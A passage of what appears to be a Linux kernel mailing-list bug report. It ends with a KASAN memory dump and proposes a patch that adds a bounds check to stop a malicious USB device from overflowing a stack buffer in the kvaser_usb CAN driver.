[   12.973743]  ffff888008347080: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00
[   12.976391]  ffff888008347100: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00
[   12.979047] ==================================================================

My best guess at a fix would be to check the bounds of the output
buffer as well. Below I've written an attempt at a patch. (I know that
it will fail to merge because gmail will break patches, sorry about
that, I'm working on getting myself permissions to download an email
client onto my work laptop that will let me send well-formatted
patches to you all asap.)

Author: Nicholas Carlini <nicholas@carlini.com>
Date:   Mon Feb 16 18:12:33 2026 +0000

    can: kvaser_usb: fix stack buffer overflow in kvaser_usb_leaf_wait_cmd()

    kvaser_usb_leaf_wait_cmd() copies a command response from a USB device into
    a caller-provided struct kvaser_cmd on the stack. The length of the copy is
    provided by the command byte on the USB data (tmp->len), which can be fully
    controlled by a malicious USB device. The maximum size of tmp->len is 255,
    but the destination buffer is only sizeof(struct kvaser_cmd) bytes (~32).

    Add a bounds check to ensure that tmp->len does not exceed sizeof(*cmd)
    before memcpy.

    Fixes: 080f40a6fa28 ("can: kvaser_usb: Add support for Kvaser
CAN/USB devices")
    Signed-off-by: Nicholas Carlini <nicholas@carlini.com>

diff --git a/drivers/net/can/usb/kvaser_usb/kvaser_usb_leaf.c
b/drivers/net/can/usb/kvaser_usb/kvaser_usb_leaf.c
index 1167d38344f1..465c3a6801e4 100644
--- a/drivers/net/can/usb/kvaser_usb/kvaser_usb_leaf.c
+++ b/drivers/net/can/usb/kvaser_usb/kvaser_usb_leaf.c
@@ -698,6 +698,13 @@ static int kvaser_usb_leaf_wait_cmd(const struct
kvaser_usb *dev, u8 id,
                        }

                        if (tmp->id == id) {
+                               if (tmp->len > sizeof(*cmd)) {
+                                       dev_err_ratelimited(&dev->intf->dev,
+                                               "Command %u too long
(%u, max %zu)\n",
+                                               tmp->id, tmp->len,
sizeof(*cmd));
+                                       err = -EIO;
+                                       goto end;
+                               }
                                memcpy(cmd, tmp, tmp->len);
                                goto end;
                        }

Thanks,
Nicholas

